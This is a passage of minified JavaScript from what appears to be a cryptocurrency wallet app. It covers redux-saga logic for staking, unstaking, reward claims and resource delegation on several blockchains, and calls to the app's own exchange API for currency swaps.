                            privateKey: e.wallet.privateKey,
                            address: e.wallet.address,
                            rewardAddress: e.wallet.rewardAddress
                        },
                        validators: a
                    });
                    if ("SUCCESS" === n.status || n.totalRewards)
                        return {
                            type: "STAKING_INFO_SUCCESS",
                            ...n
                        };
                    if ("ERROR" === n.status || n.reason)
                        return {
                            type: "STAKING_ADAPTERS_ERROR",
                            ...n
                        }
                }
                return {
                    type: "STAKING_APP_ERROR"
                }
            } catch (e) {
                return {
                    type: "STAKING_APP_ERROR",
                    description: JSON.stringify(e)
                }
            }
        }
        ;
        function *fetchActiveStakingInfoByWalletCase(e) {
            const {wallet: t, validators: a} = e.payload
              , n = undefined;
            if (yield(0,
            Df.Ys)(nx))
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Loading staking information..."
            }));
            const r = yield(0,
            Df.RE)(fetchStakingInfoByWallet, {
                wallet: t,
                validators: a
            })
              , l = {
                status: {
                    isPendingTx: !1
                },
                fetchStatus: r.type,
                dto: r,
                meta: {
                    uuid: t.uuid || "",
                    currency: t.currency,
                    address: t.address,
                    balance: t.balance,
                    contractAddress: t.contractAddress,
                    privateKey: t.privateKey,
                    rewardAddress: t.rewardAddress
                }
            };
            yield(0,
            Df.gz)(lb.setActiveStaking({
                wallet: l
            }));
            yield(0,
            Df.gz)(lb.setStakeInfoByWallet({
                wallet: l
            }));
            yield(0,
            Df.gz)(lb.setLoadingStop())
        }
        function *updateBalanceByUuidCase(e) {
            const {uuid: t} = e.payload;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Updating wallet balance..."
            }));
            const a = {
                type: lw
            };
            try {
                const e = yield(0,
                Df.Ys)(eu)
                  , a = yield e(t);
                if (!a)
                    throw new Error("Wallet not found");
                yield(0,
                Df.xN)(updateBalanceByWallet(a, !0))
            } catch (e) {
                const t = e.message || "Update balance error";
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: t
                }));
                a.type = sw
            } finally {
                yield(0,
                Df.gz)(lb.setLoadingStop())
            }
            return a
        }
        const claimConfirm = async e => {
            try {
                const a = await Se.Z.getApiByWallet(e.wallet)
                  , n = await a.claim({
                    wallet: e.wallet,
                    fee: e.fee
                });
                if ("hash"in n && n.hash)
                    return {
                        type: "CLAIM_SUCCESS",
                        hash: n.hash
                    };
                let r;
                "rawError"in n && n.rawError && (r = n.rawError);
                let l = "Failed claim";
                if ("error"in n && n.error) {
                    var t;
                    l = n.error;
                    "trx" === (null === (t = e.wallet) || void 0 === t ? void 0 : t.currency) && n.error.includes("The last withdraw time is") ? l = "Claim available once every 24 hours and no earlier than 24 hours after the staking. Please try again later." : r && "message"in r && r.message && (l = r.message)
                }
                ge.b.error(ge.d.CLAIM_ERROR, {
                    address: e.wallet.address,
                    currency: e.wallet.currency,
                    description: l,
                    error: r
                });
                return {
                    type: "STAKING_ADAPTERS_ERROR",
                    description: l,
                    rawError: r
                }
            } catch (e) {
                const t = undefined;
                return {
                    type: "STAKING_APP_ERROR",
                    description: e.message || "Failed claim"
                }
            }
        }
        ;
        function *claimConfirmCase(e) {
            const {wallet: t, fee: a, uuid: n} = e.payload
              , r = undefined;
            if (yield(0,
            Df.Ys)(nx))
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Checking the information..."
            }));
            const l = cc.$.txPerformanceStart()
              , {type: s} = yield(0,
            Df.RE)(updateBalanceByUuidCase, {
                type: (0,
                te.getType)(lb.updateWalletBalanceByUuid),
                payload: {
                    uuid: n
                }
            });
            if (s === sw)
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Broadcasting transaction to network..."
            }));
            const i = yield(0,
            Df.RE)(claimConfirm, {
                wallet: t,
                fee: a
            })
              , o = cc.$.txPerformanceEnd(l);
            cc.$.send(cc.d.CLAIM_SEND, t.currency);
            cc.$.send(cc.d.PERFORMANCE_TX_CLAIM, t.currency, `${o} ms`);
            switch (i.type) {
            case "CLAIM_SUCCESS":
                yield(0,
                Df.gz)(lb.setTransactionHash({
                    hash: i.hash
                }));
                break;
            case "STAKING_APP_ERROR":
            case "STAKING_ADAPTERS_ERROR":
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: i.description || "Claim failed"
                }));
                break;
            default:
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: "Claim failed"
                }))
            }
            yield(0,
            Df.gz)(lb.setLoadingStop())
        }
        const unstakeConfirm = async e => {
            try {
                const t = await Se.Z.getApiByWallet(e.wallet)
                  , a = await t.unstake({
                    wallet: e.wallet,
                    privateKey: e.wallet.privateKey,
                    validatorAddress: e.validatorAddress,
                    fee: e.fee,
                    amount: e.amount,
                    resource: e.resource,
                    stakingVersion: e.stakingVersion
                });
                if ("hash"in a && a.hash)
                    return {
                        type: "UNSTAKE_SUCCESS",
                        hash: a.hash
                    };
                let n;
                "rawError"in a && a.rawError && (n = a.rawError);
                let r = "Failed unstake";
                if ("error"in a && a.error) {
                    r = a.error;
                    n && "message"in n && n.message && (r = n.message)
                }
                ge.b.error(ge.d.UNSTAKE_ERROR, {
                    address: e.wallet.address,
                    currency: e.wallet.currency,
                    description: r,
                    error: n
                });
                return {
                    type: "STAKING_ADAPTERS_ERROR",
                    description: r,
                    rawError: n
                }
            } catch (t) {
                const a = t.message || "Failed unstake";
                ge.b.error(ge.d.UNSTAKE_ERROR, {
                    address: e.wallet.address,
                    currency: e.wallet.currency,
                    description: "",
                    error: t
                });
                return {
                    type: "STAKING_APP_ERROR",
                    description: a
                }
            }
        }
        ;
        function *unstakeConfirmCase(e) {
            const {wallet: t, fee: a, uuid: n, amount: r, validatorAddress: l, resource: s, stakingVersion: i} = e.payload
              , o = undefined;
            if (yield(0,
            Df.Ys)(nx))
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Checking the information..."
            }));
            const c = cc.$.txPerformanceStart()
              , {type: u} = yield(0,
            Df.RE)(updateBalanceByUuidCase, {
                type: (0,
                te.getType)(lb.updateWalletBalanceByUuid),
                payload: {
                    uuid: n
                }
            });
            if (u === sw)
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Broadcasting transaction to network..."
            }));
            const d = yield(0,
            Df.RE)(unstakeConfirm, {
                wallet: t,
                fee: a,
                amount: r,
                validatorAddress: l,
                resource: s,
                stakingVersion: i
            })
              , m = cc.$.txPerformanceEnd(c);
            cc.$.send(cc.d.UNSTAKING_SEND, t.currency);
            cc.$.send(cc.d.PERFORMANCE_TX_UNSTAKE, t.currency, `${m} ms`);
            switch (d.type) {
            case "UNSTAKE_SUCCESS":
                yield(0,
                Df.gz)(lb.setTransactionHash({
                    hash: d.hash
                }));
                break;
            case "STAKING_APP_ERROR":
            case "STAKING_ADAPTERS_ERROR":
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: d.description || "Unstaking failed"
                }));
                break;
            default:
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: "Unstaking failed"
                }))
            }
            yield(0,
            Df.gz)(lb.setLoadingStop())
        }
        const stakeConfirm = async e => {
            try {
                const t = await Se.Z.getApiByWallet(e.wallet)
                  , a = await t.stake({
                    ...e
                });
                if ("hash"in a && a.hash) {
                    ge.b.error(ge.d.STAKING_SUCCESS, `STAKING_SUCCESS hash - ${a.hash}`);
                    return {
                        type: "STAKE_SUCCESS",
                        hash: a.hash
                    }
                }
                let n;
                "rawError"in a && a.rawError && (n = a.rawError);
                let r = "Failed stake";
                if ("error"in a && a.error) {
                    r = a.error;
                    n && "message"in n && n.message && (r = n.message)
                }
                ge.b.error(ge.d.STAKING_ERROR, `STAKING_ADAPTERS_ERROR\n${r}\n${n}`);
                return {
                    type: "STAKING_ADAPTERS_ERROR",
                    description: r,
                    rawError: n
                }
            } catch (e) {
                const t = e.message || "Failed stake";
                ge.b.error(ge.d.STAKING_ERROR, "STAKING_ERROR", e, t);
                return {
                    type: "STAKING_APP_ERROR",
                    description: t
                }
            }
        }
        ;
        function *stakeConfirmCase(e) {
            const {wallet: t, fee: a, uuid: n, amount: r, validatorAddress: l, resource: s} = e.payload
              , i = undefined;
            if (yield(0,
            Df.Ys)(nx))
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Checking the information..."
            }));
            const o = cc.$.txPerformanceStart()
              , {type: c} = yield(0,
            Df.RE)(updateBalanceByUuidCase, {
                type: (0,
                te.getType)(lb.updateWalletBalanceByUuid),
                payload: {
                    uuid: n
                }
            });
            if (c === sw)
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Broadcasting transaction to network..."
            }));
            const u = yield(0,
            Df.RE)(stakeConfirm, {
                wallet: t,
                fee: a,
                amount: r,
                validatorAddress: l,
                resource: s
            })
              , d = cc.$.txPerformanceEnd(o);
            cc.$.send(cc.d.STAKING_SEND, t.currency);
            cc.$.send(cc.d.PERFORMANCE_TX_STAKE, t.currency, `${d} ms`);
            switch (u.type) {
            case "STAKE_SUCCESS":
                yield(0,
                Df.gz)(lb.setTransactionHash({
                    hash: u.hash
                }));
                break;
            case "STAKING_ADAPTERS_ERROR":
            case "STAKING_APP_ERROR":
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: u.description || "Staking failed"
                }));
                break;
            default:
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: "Staking failed"
                }))
            }
            yield(0,
            Df.gz)(lb.setLoadingStop())
        }
        const fetchCurrentEpoch = async e => {
            try {
                const t = await Se.Z.getApiByWallet(e.wallet)
                  , a = await t.getCurrentEpoch();
                if (a)
                    return {
                        type: "CURRENT_EPOCH_SUCCESS",
                        epoch: a
                    };
                let n;
                "rawError"in a && a.rawError && (n = a.rawError);
                let r = "Failed fetch current epoch";
                if ("error"in a && a.error) {
                    r = a.error;
                    n && "message"in n && n.message && (r = n.message)
                }
                return {
                    type: "STAKING_ADAPTERS_ERROR",
                    description: r,
                    rawError: n
                }
            } catch (e) {
                const t = undefined;
                return {
                    type: "STAKING_APP_ERROR",
                    description: e.message || "Failed fetch current epoch"
                }
            }
        }
        ;
        function *fetchCurrentEpochCase(e) {
            const {wallet: t} = e.payload
              , a = yield(0,
            Df.RE)(fetchCurrentEpoch, {
                wallet: t
            });
            switch (a.type) {
            case "CURRENT_EPOCH_SUCCESS":
                yield(0,
                Df.gz)(lb.setCurrentEpoch({
                    epoch: a.epoch
                }));
                break;
            case "STAKING_APP_ERROR":
            case "STAKING_ADAPTERS_ERROR":
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: a.description || "Failed fetch current epoch"
                }));
                break;
            default:
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: "Failed fetch current epoch"
                }))
            }
        }
        const getValidatorsToolsByTicker = e => {
            let {ticker: t} = e;
            switch (t) {
            case "ada-shelley":
                return {
                    selectedValidators: validators_ada_selectedValidators,
                    fetchValidators: validators_ada_fetchValidators
                };
            case "atom":
                return {
                    selectedValidators,
                    fetchValidators
                };
            case "one":
                return {
                    selectedValidators: validators_one_selectedValidators,
                    fetchValidators: validators_one_fetchValidators
                };
            case "ont":
                return {
                    selectedValidators: validators_ont_selectedValidators,
                    fetchValidators: validators_ont_fetchValidators
                };
            case "qtum":
                return {
                    selectedValidators: validators_qtum_selectedValidators,
                    fetchValidators: validators_qtum_fetchValidators
                };
            case "trx":
                return {
                    selectedValidators: validators_trx_selectedValidators,
                    fetchValidators: validators_trx_fetchValidators
                };
            case "xtz":
                return {
                    selectedValidators: validators_xtz_selectedValidators,
                    fetchValidators: validators_xtz_fetchValidators
                };
            case "zil":
                return {
                    selectedValidators: validators_zil_selectedValidators,
                    fetchValidators: validators_zil_fetchValidators
                };
            default:
                return {
                    selectedValidators: void 0,
                    fetchValidators: void 0
                }
            }
        }
        ;
        function batchSlicer(e, t) {
            const a = [];
            for (let n = 0; n < e.length; n += t)
                a.push(e.slice(n, n + t));
            return a
        }
        function *updateBatchWalletsStakeInfoSaga(e) {
            let {walletsBatch: t} = e;
            yield(0,
            Df.$6)(t.map((e => (0,
            Df.RE)((function*() {
                try {
                    const {fetchValidators: t, selectedValidators: a} = getValidatorsToolsByTicker({
                        ticker: e.currency
                    });
                    let n = [];
                    if (t && a) {
                        yield(0,
                        Df.xN)(t());
                        const e = yield(0,
                        Df.Ys)(a);
                        null != e && e.length && (n = e)
                    }
                    yield(0,
                    Df.gz)(lb.updateStakeInfoByWallet({
                        wallet: e,
                        validators: n
                    }))
                } catch (t) {
                    console.log(`updateBatchWalletsStakeInfo | ${e.currency} | ${t}`);
                    return
                }
            }
            )))))
        }
        function *updateStakeInfo(e) {
            let {wallets: t} = e;
            const {stakingBatchAmount: a, stakingBatchDelay: n} = yield(0,
            Df.Ys)(ux);
            for (const e of batchSlicer(t, a)) {
                yield(0,
                Df.RE)(updateBatchWalletsStakeInfoSaga, {
                    walletsBatch: e
                });
                yield(0,
                Df.gw)(n)
            }
        }
        function *oneTimeStakeInfoUpdate() {
            const e = undefined;
            if (!0 === (yield(0,
            Df.Ys)(Bo))) {
                yield(0,
                Df.gw)(100);
                return
            }
            yield(0,
            Df.xN)(lb.fetchStakingVars());
            const {stakingUpdateInterval: t} = yield(0,
            Df.Ys)(ux)
              , a = yield(0,
            Df.Ys)(ru);
            yield(0,
            Df.$6)([(0,
            Df.gw)(t), (0,
            Df.RE)(updateStakeInfo, {
                wallets: a
            })])
        }
        function *selectedWalletsUpdateStakeInfoCycle() {
            for (; ; )
                yield(0,
                Df.RE)(oneTimeStakeInfoUpdate)
        }
        function *startGradualInfiniteStakingInfoUpdate() {
            for (; ; ) {
                const {isLogout: e} = yield(0,
                Df.S3)({
                    cycle: (0,
                    Df.RE)(selectedWalletsUpdateStakeInfoCycle),
                    isLogout: (0,
                    Df.qn)((0,
                    te.getType)(ae))
                });
                e && (yield(0,
                Df.qn)(lb.initializeStakingInfoUpdater))
            }
        }
        function *updateStakeInfoPeriodically() {
            yield(0,
            Df.Cs)(startGradualInfiniteStakingInfoUpdate)
        }
        function *stakeInfoUpdater() {
            yield(0,
            Df.qn)(lb.initializeStakingInfoUpdater);
            yield(0,
            Df.RE)(updateStakeInfoPeriodically);
            for (; ; )
                yield(0,
                Df.qn)(lb.initializeStakingInfoUpdater)
        }
        function *updateStakeInfoOnceCase_updateBatchWalletsStakeInfoSaga(e) {
            let {walletsBatch: t} = e;
            const a = undefined;
            !0 !== (yield(0,
            Df.Ys)(Bo)) && (yield(0,
            Df.$6)(t.map((e => (0,
            Df.RE)((function*() {
                try {
                    const {fetchValidators: t, selectedValidators: a} = getValidatorsToolsByTicker({
                        ticker: e.currency
                    });
                    let n = [];
                    if (t && a) {
                        yield(0,
                        Df.xN)(t());
                        const e = yield(0,
                        Df.Ys)(a);
                        null != e && e.length && (n = e)
                    }
                    yield(0,
                    Df.gz)(lb.updateStakeInfoByWallet({
                        wallet: e,
                        validators: n
                    }))
                } catch (t) {
                    console.log(`updateBatchWalletsStakeInfo | ${e.currency} | ${t}`);
                    return
                }
            }
            ))))))
        }
        function *updateStakeInfoOnceCase() {
            const e = undefined;
            if (yield(0,
            Df.Ys)(dx))
                return;
            yield(0,
            Df.gz)(lb.startOnceStakingInfoUpdate());
            const t = yield(0,
            Df.Ys)(ru)
              , {stakingBatchAmount: a, stakingBatchDelay: n} = yield(0,
            Df.Ys)(ux);
            for (const e of batchSlicer(t, a)) {
                yield(0,
                Df.RE)(updateStakeInfoOnceCase_updateBatchWalletsStakeInfoSaga, {
                    walletsBatch: e
                });
                yield(0,
                Df.gw)(n)
            }
            yield(0,
            Df.gz)(lb.finishOnceStakingInfoUpdate())
        }
        function *oneTimeStakeInfoUpdateCase() {
            const e = undefined;
            if (!(yield(0,
            Df.Ys)(mx))) {
                yield(0,
                Df.gz)(lb.setIsOneTimeFetchStart());
                yield(0,
                Df.RE)(oneTimeStakeInfoUpdate);
                yield(0,
                Df.gz)(lb.setIsOneTimeFetchEnd())
            }
        }
        async function delegateResourceConfirm(e) {
            try {
                const t = await Se.Z.getApiByWallet(e.wallet)
                  , a = await t.delegateResource({
                    amount: e.amount,
                    addressFrom: e.wallet.address,
                    addressTo: e.addressTo,
                    privateKey: e.wallet.privateKey,
                    resource: e.resource,
                    lock: e.lock,
                    lockPeriodSeconds: e.lockPeriodSeconds
                });
                return "hash"in a && a.hash ? {
                    type: "DELEGATE_RESOURCE_SUCCESS",
                    hash: a.hash
                } : {
                    type: "DELEGATE_RESOURCE_ADAPTER_ERROR",
                    description: "error"in a && a.error ? a.error : "Failed delegate"
                }
            } catch (e) {
                return {
                    type: "DELEGATE_RESOURCE_APP_ERROR",
                    description: e.message || "Failed delegate"
                }
            }
        }
        function *delegateResourceConfirmCase(e) {
            const {wallet: t, uuid: a, addressTo: n, amount: r, resource: l, lock: s, lockPeriodSeconds: i} = e.payload
              , o = undefined;
            if (yield(0,
            Df.Ys)(nx))
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Checking the information..."
            }));
            const {type: c} = yield(0,
            Df.RE)(updateBalanceByUuidCase, {
                type: (0,
                te.getType)(lb.updateWalletBalanceByUuid),
                payload: {
                    uuid: a
                }
            });
            if (c === sw)
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Broadcasting transaction to network..."
            }));
            const u = yield(0,
            Df.RE)(delegateResourceConfirm, {
                amount: r,
                wallet: t,
                addressTo: n,
                resource: l,
                lock: s,
                lockPeriodSeconds: i
            });
            switch (u.type) {
            case "DELEGATE_RESOURCE_SUCCESS":
                yield(0,
                Df.gz)(lb.setTransactionHash({
                    hash: u.hash
                }));
                break;
            case "DELEGATE_RESOURCE_APP_ERROR":
            case "DELEGATE_RESOURCE_ADAPTER_ERROR":
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: u.description || "Delegation resource failed"
                }));
                break;
            default:
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: "Delegation resource failed"
                }))
            }
            yield(0,
            Df.gz)(lb.setLoadingStop())
        }
        async function undelegateResourceConfirm(e) {
            try {
                const t = await Se.Z.getApiByWallet(e.wallet)
                  , a = await t.undelegateResource({
                    amount: e.amount,
                    addressFrom: e.wallet.address,
                    addressTo: e.addressTo,
                    privateKey: e.wallet.privateKey,
                    resource: e.resource
                });
                return "hash"in a && a.hash ? {
                    type: "UNDELEGATE_RESOURCE_SUCCESS",
                    hash: a.hash
                } : {
                    type: "UNDELEGATE_RESOURCE_ADAPTER_ERROR",
                    description: "error"in a && a.error ? a.error : "Failed undelegate"
                }
            } catch (e) {
                return {
                    type: "UNDELEGATE_RESOURCE_APP_ERROR",
                    description: e.message || "Failed undelegate"
                }
            }
        }
        function *undelegateResourceConfirmCase(e) {
            const {wallet: t, uuid: a, addressTo: n, amount: r, resource: l} = e.payload
              , s = undefined;
            if (yield(0,
            Df.Ys)(nx))
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Checking the information..."
            }));
            const {type: i} = yield(0,
            Df.RE)(updateBalanceByUuidCase, {
                type: (0,
                te.getType)(lb.updateWalletBalanceByUuid),
                payload: {
                    uuid: a
                }
            });
            if (i === sw)
                return;
            yield(0,
            Df.gz)(lb.setLoadingStart({
                processText: "Broadcasting transaction to network..."
            }));
            const o = yield(0,
            Df.RE)(undelegateResourceConfirm, {
                amount: r,
                wallet: t,
                addressTo: n,
                resource: l
            });
            switch (o.type) {
            case "UNDELEGATE_RESOURCE_SUCCESS":
                yield(0,
                Df.gz)(lb.setTransactionHash({
                    hash: o.hash
                }));
                break;
            case "UNDELEGATE_RESOURCE_APP_ERROR":
            case "UNDELEGATE_RESOURCE_ADAPTER_ERROR":
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: o.description || "Undelegation resource failed"
                }));
                break;
            default:
                yield(0,
                Df.gz)(lb.setErrorMessage({
                    message: "Undelegation resource failed"
                }))
            }
            yield(0,
            Df.gz)(lb.setLoadingStop())
        }
        function *updateStakeInfoByWalletCase(e) {}
        function *fetchStakingInfoByWalletSaga() {
            yield(0,
            Df.Fm)((0,
            te.getType)(lb.fetchActiveStakingInfoByWallet), fetchActiveStakingInfoByWalletCase)
        }
        function *updateStakeInfoByWallet() {
            yield(0,
            Df.ib)((0,
            te.getType)(lb.updateStakeInfoByWallet), updateStakeInfoByWalletCase)
        }
        function *claimConfirmSaga() {
            yield(0,
            Df.A7)((0,
            te.getType)(lb.claimConfirm), claimConfirmCase)
        }
        function *unstakeConfirmSaga() {
            yield(0,
            Df.A7)((0,
            te.getType)(lb.unstakeConfirm), unstakeConfirmCase)
        }
        function *stakeConfirmSaga() {
            yield(0,
            Df.A7)((0,
            te.getType)(lb.stakeConfirm), stakeConfirmCase)
        }
        function *updateBalanceByUuidSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(lb.updateWalletBalanceByUuid), updateBalanceByUuidCase)
        }
        function *fetchCurrentEpochSaga() {
            yield(0,
            Df.A7)((0,
            te.getType)(lb.fetchCurrentEpoch), fetchCurrentEpochCase)
        }
        function *stakeInfoUpdaterSaga() {
            yield(0,
            Df.Cs)(stakeInfoUpdater)
        }
        function *fetchStakingVarsSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(lb.fetchStakingVars), fetchStakingVarsCase)
        }
        function *updateStakeInfoOnceSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(lb.updateStakeInfoOnce), updateStakeInfoOnceCase)
        }
        function *oneTimeStakeInfoUpdateSaga() {
            yield(0,
            Df.A7)((0,
            te.getType)(lb.oneTimeStakeInfoUpdate), oneTimeStakeInfoUpdateCase)
        }
        function *delegateResourceConfirmSaga() {
            yield(0,
            Df.A7)((0,
            te.getType)(lb.delegateResourceConfirm), delegateResourceConfirmCase)
        }
        function *undelegateResourceConfirmSaga() {
            yield(0,
            Df.A7)((0,
            te.getType)(lb.undelegateResourceConfirm), undelegateResourceConfirmCase)
        }
        const Vce = [(0,
        Df.rM)(fetchStakingInfoByWalletSaga)]
          , Kce = [(0,
        Df.rM)(claimConfirmSaga)]
          , Hce = [(0,
        Df.rM)(updateBalanceByUuidSaga)]
          , zce = [(0,
        Df.rM)(unstakeConfirmSaga)]
          , jce = [(0,
        Df.rM)(delegateResourceConfirmSaga)]
          , $ce = [(0,
        Df.rM)(undelegateResourceConfirmSaga)]
          , Zce = [(0,
        Df.rM)(stakeConfirmSaga)]
          , Yce = [(0,
        Df.rM)(fetchCurrentEpochSaga)]
          , qce = [(0,
        Df.rM)(updateStakeInfoByWallet)]
          , Xce = [(0,
        Df.rM)(stakeInfoUpdaterSaga)]
          , Qce = [(0,
        Df.rM)(fetchStakingVarsSaga)]
          , Jce = [(0,
        Df.rM)(updateStakeInfoOnceSaga)]
          , eue = [(0,
        Df.rM)(oneTimeStakeInfoUpdateSaga)]
          , isOutOrRangeError = e => {
            var t, a, n, r;
            let l;
            "message"in e && (l = e.message);
            if ("data"in e) {
                var s;
                l = null === (s = e.data) || void 0 === s ? void 0 : s.message
            }
            return (null === (t = l) || void 0 === t ? void 0 : t.includes("out of range")) || (null === (a = l) || void 0 === a ? void 0 : a.includes("too small")) || (null === (n = l) || void 0 === n ? void 0 : n.includes("max amount")) || (null === (r = l) || void 0 === r ? void 0 : r.includes("amount more than"))
        }
          , exchangeTransactionMapper = e => ({
            ...e,
            exchangeId: e.id,
            amountSend: e.amountFrom,
            amountReceive: e.amountTo,
            amountReceiveInitial: ""
        })
          , getExchangeCurrencies = async () => {
            try {
                const {data: e} = await U.Ed.get("/exchange/v1/api/get-currencies", {
                    timeout: 5e3
                });
                if ("error"in e && e.error) {
                    ge.b.error(ge.d.FAILED_GET_EXCHANGE_CURRENCIES, e.message);
                    return {
                        type: vi,
                        description: (null == e ? void 0 : e.message) || gi
                    }
                }
                return {
                    type: yi,
                    currencies: e
                }
            } catch (e) {
                ge.b.error(ge.d.FAILED_GET_EXCHANGE_CURRENCIES, e);
                return {
                    type: vi,
                    description: (null == e ? void 0 : e.message) || gi
                }
            }
        }
          , getExchangeTransactionById = async e => {
            let {id: t, partner: a} = e;
            try {
                const {data: e} = await U.Ed.get(`/exchange/v1/api/get-transaction/${a}/${t}`);
                if ("error"in e.transaction && e.transaction.error) {
                    var n;
                    ge.b.error(ge.d.FAILED_GET_EXCHANGE_TRANSACTION_BY_ID, e.transaction.message);
                    return {
                        type: vi,
                        description: (null === (n = e.transaction) || void 0 === n ? void 0 : n.message) || gi
                    }
                }
                const r = exchangeTransactionMapper(e.transaction);
                return {
                    type: yi,
                    data: r
                }
            } catch (e) {
                ge.b.error(ge.d.FAILED_GET_EXCHANGE_TRANSACTION_BY_ID, e.message);
                return {
                    type: vi,
                    description: (null == e ? void 0 : e.message) || gi
                }
            }
        }
          , handleCreateExchangeTransaction = async e => {
            try {
                const t = {
                    ...e
                };
                delete t.isWithDuster;
                const {data: a} = await U.Ed.post("/exchange/v1/api/create-transaction", t);
                if ("error"in a && a.error)
                    throw new Error(`Failed create exchange transaction: ${JSON.stringify(a)}`);
                return {
                    type: yi,
                    transaction: a
                }
            } catch (t) {
                ge.b.error(ge.d.CANT_CREATE_EXCHANGE_TX_BY_API, {
                    currency: e.fromCurrency
                }, t, e);
                return {
                    type: vi,
                    message: "Failed to create exchange transaction"
                }
            }
        }
          , handleCreateOrderInfo = async e => {
            try {
                const t = {
                    ...e
                }
                  , {data: a} = await U.Ed.post("/exchange/v1/api/create-order-info", t);
                if ("error"in a && null != a && a.error)
                    throw new Error(`Failed to create order info: ${JSON.stringify(a)}`);
                return {
                    type: yi,
                    data: a
                }
            } catch (t) {
                ge.b.error(ge.d.CANT_CREATE_ORDER_INFO, {
                    currency: e.fromCurrency
                }, t, e);
                return {
                    type: vi,
                    message: "Failed to create order info"
                }
            }
        }
          , handleFetchExchangeInfo = async e => {
            let {fromWallet: t, toWallet: a, amount: n, exchangeCurrencies: r} = e;
            try {
                if (!t || !a || !n || 0 === Number(n))
                    return {
                        type: _i
                    };
                const e = undefined;
                if (!checkIsTokenSupported(t, a, r))
                    return {
                        type: bi
                    };
                const {fromCurrency: s, toCurrency: i, fromNetwork: o, toNetwork: c} = prepareDataToFetchLimitsAndEstimate(t, a)
                  , {data: u} = await U.Ed.get("/exchange/v1/api/get-info", {
                    params: {
                        fromCurrency: s,
                        fromNetwork: o,
                        toCurrency: i,
                        toNetwork: c,
                        amount: n
                    },
                    timeout: 35e3
                });
                if ("error"in u && u.error && (isOutOrRangeError(u) || Boolean(Number(u.minAmount)))) {
                    var l;
                    return {
                        type: wi,
                        error: Ei,
                        minAmount: u.minAmount,
                        maxAmount: u.maxAmount,
                        partner: null !== (l = null == u ? void 0 : u.partner) && void 0 !== l ? l : null
                    }
                }
                const {toAmount: d, quotaId: m, partner: p, minAmount: f, maxAmount: E, amountOutMin: h} = u;
                if ("error"in u && u.error || "toAmount"in u && void 0 === u.toAmount) {
                    "message"in u && ge.b.error(ge.d.FAILED_GET_EXCHANGE_ESTIMATES, u.message);
                    return {
                        type: vi,
                        partner: p,
                        minAmount: f,
                        maxAmount: E,
                        amountOutMin: h,
                        description: (null == u ? void 0 : u.message) || gi
                    }
                }
                return {
                    type: yi,
                    toAmount: null == d ? void 0 : d.toString(),
                    partner: p,
                    quotaId: m,
                    minAmount: f,
                    maxAmount: E,
                    amountOutMin: h
                }
            } catch (e) {
                var s;
                ge.b.error(ge.d.FAILED_GET_EXCHANGE_ESTIMATES, e);
                return isOutOrRangeError(null == e || null === (s = e.response) || void 0 === s ? void 0 : s.data) ? {
                    type: wi,
                    error: Ei
                } : {
                    type: vi,
                    description: (null == e ? void 0 : e.message) || gi
                }
            }
        }
          , fetchTotalGethBalance = async () => {
            try {
                const {data: e} = await U.Ed.get("/exchange/v1/api/get-geth-balance", {
                    timeout: 5e3
                });
                return e
            } catch (e) {
                return {
                    error: !0,
                    message: e.message
                }
            }
        }
          , tue = 18e4;
        function *fetchExchangeCurrencies() {
            const e = yield(0,
            Df.Ys)(xi)
              , t = yield(0,
            Df.Ys)(Ii)
              , a = (new Date).getTime()
              , n = !t || t + tue < a;
            if (0 !== e.length && !n)
                return;
            const r = yield(0,
            Df.RE)(getExchangeCurrencies);
            "FETCH_SUCCESS" === r.type && (yield(0,
            Df.gz)(Fu.setExchangeCurrencies({
                currencies: r.currencies
            })));
            yield(0,
            Df.gz)(Fu.setLastCurrenciesFetched(a))
        }
        function *fetchAllFletcherTokens() {
            const e = undefined;
            if ((yield(0,
            Df.Ys)(Fi)).length)
                return;
            const t = yield(0,
            Df.RE)(fetchFletcherTokens);
            t.length && (yield(0,
            Df.gz)(Fu.setAllTokens({
                tokens: t
            })))
        }
        function *createExchangeTransaction_createExchangeTransaction(e) {
            yield(0,
            Df.gz)(Fu.setMainPageStep(U4.CREATING_EXCHANGE_TX));
            const t = yield(0,
            Df.RE)(handleCreateExchangeTransaction, e.payload);
            switch (t.type) {
            case yi:
                yield(0,
                Df.gz)(Fu.setExchangeTransaction(t.transaction));
                const a = "txData"in t.transaction
                  , n = yield(0,
                Df.Ys)(Mi);
                if (e.payload.isWithDuster && n && !a) {
                    const a = prepareDusterRequestData(t.transaction, e.payload);
                    yield(0,
                    Df.gz)(Fu.createDusterInvoice(a))
                } else
                    yield(0,
                    Df.gz)(Fu.setMainPageStep(U4.SHOW_NEXT_PAGE));
                break;
            case vi:
                yield(0,
                Df.gz)(Fu.setExchangeError(t.message || ""));
                yield(0,
                Df.gz)(Fu.setMainPageStep(U4.WAIT_FOR_EXCHANGE))
            }
        }
        function *createOrderInfo(e) {
            const t = yield(0,
            Df.RE)(handleCreateOrderInfo, e.payload);
            switch (t.type) {
            case yi:
                yield(0,
                Df.gz)(Fu.setOrderInfo(t.data));
                break;
            case vi:
                yield(0,
                Df.gz)(Fu.setOrderError(t.message || ""))
            }
        }
        const handleCreateDusterInvoice = async e => {
